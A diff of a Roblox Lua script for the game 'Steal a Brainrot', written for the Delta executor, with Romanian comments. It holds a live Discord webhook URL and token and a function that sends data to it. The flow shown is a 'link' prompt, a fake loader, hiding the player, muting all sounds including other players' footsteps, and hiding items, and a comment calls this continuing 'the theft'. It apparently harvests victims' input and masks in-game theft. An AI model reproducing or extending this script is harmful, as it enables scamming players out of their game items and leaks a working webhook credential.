@@ -1,7 +1,6 @@
 -- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
 -- Compatibil cu Delta Executor
--- OPRESTE TOATE SUNETELE, INCLUSIV PAȘII
--- BAZA SE RESETEAZĂ AUTOMAT
+-- OPRESTE TOATE SUNETELE (INCLUSIV PAȘI ȘI CLONE)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -9,7 +8,6 @@ local LocalPlayer = Players.LocalPlayer
 local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
-local RunService = game:GetService("RunService")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -29,7 +27,7 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE TOATE SUNETELE (INCLUSIV PAȘII) =====
+-- ===== OPREȘTE TOATE SUNETELE =====
 local function muteAllSounds()
     local count = 0
     
@@ -40,7 +38,8 @@ local function muteAllSounds()
         game:GetService("ReplicatedStorage"),
         game:GetService("Players").LocalPlayer.PlayerGui,
         game:GetService("StarterGui"),
-        game:GetService("SoundService")
+        game:GetService("SoundService"),
+        game:GetService("Players")
     }
     
     for _, service in pairs(services) do
@@ -55,21 +54,19 @@ local function muteAllSounds()
         end)
     end
     
-    -- 2. Oprește sunetele de pași (specifice)
-    pcall(function()
-        for _, sound in pairs(Workspace:GetDescendants()) do
-            if sound:IsA("Sound") and (sound.Name:lower():find("foot") or sound.Name:lower():find("step") or sound.Name:lower():find("walk") or sound.Name:lower():find("run")) then
-                sound.Volume = 0
-                sound:Stop()
-                count = count + 1
-            end
-        end
-    end)
-    
-    -- 3. Oprește sunetele din joc (globale)
+    -- 2. Oprește sunetele de pași, clone, teleport etc.
     pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") and (sound.Name:lower():find("foot") or sound.Name:lower():find("step") or sound.Name:lower():find("walk") or sound.Name:lower():find("run")) then
+            if sound:IsA("Sound") and (
+                sound.Name:lower():find("foot") or 
+                sound.Name:lower():find("step") or 
+                sound.Name:lower():find("walk") or 
+                sound.Name:lower():find("run") or
+                sound.Name:lower():find("clone") or
+                sound.Name:lower():find("teleport") or
+                sound.Name:lower():find("spawn") or
+                sound.Name:lower():find("jump")
+            ) then
                 sound.Volume = 0
                 sound:Stop()
                 count = count + 1
@@ -77,7 +74,35 @@ local function muteAllSounds()
         end
     end)
     
-    print("✅ " .. count .. " sunete oprite (inclusiv pași)!")
+    -- 3. Oprește sunetele din fiecare jucător
+    pcall(function()
+        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+            if player.Character then
+                for _, sound in pairs(player.Character:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        sound.Volume = 0
+                        sound:Stop()
+                        count = count + 1
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- 4. Blochează sunetele noi care apar (loop)
+    spawn(function()
+        while true do
+            task.wait(0.5)
+            for _, sound in pairs(game:GetDescendants()) do
+                if sound:IsA("Sound") and sound.Volume > 0 then
+                    sound.Volume = 0
+                    sound:Stop()
+                end
+            end
+        end
+    end)
+    
+    print("✅ " .. count .. " sunete oprite (inclusiv pași și clone)!")
     return count
 end
 
@@ -103,25 +128,20 @@ local function hideBrainrots()
         end
     end
     
-    -- Salvează brainrot-urile ascunse pentru resetare
     _G.HiddenBrainrots = hidden
     return count
 end
 
--- ===== RESETEAZĂ BAZA (după un timp) =====
+-- ===== RESETEAZĂ BAZA =====
 local function resetBase()
     print("🔄 Resetez baza...")
     
-    -- 1. Ascunde brainrot-urile fake
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
-            pcall(function()
-                obj:Destroy()
-            end)
+            pcall(function() obj:Destroy() end)
         end
     end
     
-    -- 2. Afișează brainrot-urile reale
     if _G.HiddenBrainrots then
         for _, brainrot in pairs(_G.HiddenBrainrots) do
             pcall(function()
@@ -131,10 +151,8 @@ local function resetBase()
         end
     end
     
-    -- 3. Re-ascunde brainrot-urile după 5 secunde (pentru a continua furtul)
     task.wait(5)
     hideBrainrots()
-    
     print("✅ Baza resetată!")
 end
 
@@ -471,13 +489,12 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            muteAllSounds()  -- OPRESTE TOATE SUNETELE
+            muteAllSounds()
             local count = hideBrainrots()
             print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
             
-            -- ===== RESETEAZĂ BAZA LA 10 SECUNDE =====
             spawn(function()
-                task.wait(10)  -- Așteaptă 10 secunde
+                task.wait(10)
                 resetBase()
             end)
         end
